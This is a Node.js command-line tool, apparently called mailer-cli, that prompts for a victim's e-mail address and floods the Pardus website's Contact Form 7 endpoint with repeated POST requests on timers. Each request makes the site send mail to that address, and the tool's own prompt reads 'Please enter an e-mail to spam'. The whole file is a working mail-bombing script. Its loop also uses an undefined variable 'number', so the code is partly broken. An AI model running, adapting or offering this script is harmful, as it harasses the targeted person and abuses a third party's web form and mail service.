const readline = require("readline")
const consoled = require("consoled.js")
const fetch = require("node-fetch") // npm i node-fetch@2.6.1
const { times, delay } = require("./config.json").cli;



function prompt(question, callback) {
  if (question === undefined) return false;

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  rl.question(question + " => ", (answer) => {
    rl.close();
    callback(answer);
  });
}

function callback(email) {
  
  if (/\S+@\S+\.\S+/.test(email) !== true) return consoled.bright.red("Invalid e-mail.")
  for (let i = 0; i < number; i++) {
    setInterval(() => {
    fetch("https://www.pardus.org.tr/wp-json/contact-form-7/v1/contact-forms/18514/feedback", {
      "headers": {
        "accept": "application/json, */*;q=0.1",
        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "no-cache",
        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryKiovsaJILejIAeqg",
        "pragma": "no-cache",
        "sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin"
      },
      "referrer": "https://www.pardus.org.tr/en/home/",
      "referrerPolicy": "strict-origin-when-cross-origin",
      "body": "------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7\"\r\n\r\n18514\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_version\"\r\n\r\n5.7.7\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_locale\"\r\n\r\nen_US\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_unit_tag\"\r\n\r\nwpcf7-f18514-p18505-o1\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_container_post\"\r\n\r\n18505\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_posted_data_hash\"\r\n\r\n\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"e-mail\"\r\n\r\n" + email + "\r\n------WebKitFormBoundaryKiovsaJILejIAeqg--\r\n",
      "method": "POST",
      "mode": "cors",
      "credentials": "include"
    }).then(data => data.text()).then(data => {}).catch(err => consoled.fade.red(JSON.stringify(err)))
    },delay)

  }
  fetch("https://www.pardus.org.tr/wp-json/contact-form-7/v1/contact-forms/18514/feedback", {
      "headers": {
        "accept": "application/json, */*;q=0.1",
        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "no-cache",
        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryKiovsaJILejIAeqg",
        "pragma": "no-cache",
        "sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin"
      },
      "referrer": "https://www.pardus.org.tr/en/home/",
      "referrerPolicy": "strict-origin-when-cross-origin",
      "body": "------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7\"\r\n\r\n18514\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_version\"\r\n\r\n5.7.7\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_locale\"\r\n\r\nen_US\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_unit_tag\"\r\n\r\nwpcf7-f18514-p18505-o1\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_container_post\"\r\n\r\n18505\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_posted_data_hash\"\r\n\r\n\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"e-mail\"\r\n\r\n" + email + "\r\n------WebKitFormBoundaryKiovsaJILejIAeqg--\r\n",
      "method": "POST",
      "mode": "cors",
      "credentials": "include"
    }).then(res => res.text()).then(data => console.log(data))
  consoled.bright.green("Successfully sent " + number + " e-mails to: " + email)
  prompt("Please enter an e-mail to spam", callback)
}


consoled.bright.blue("Welcome to mailer-cli <3");
consoled.bright.magenta("https://github.com/Rednexie/mailer-cli");

  prompt("Please enter an e-mail to spam", callback)
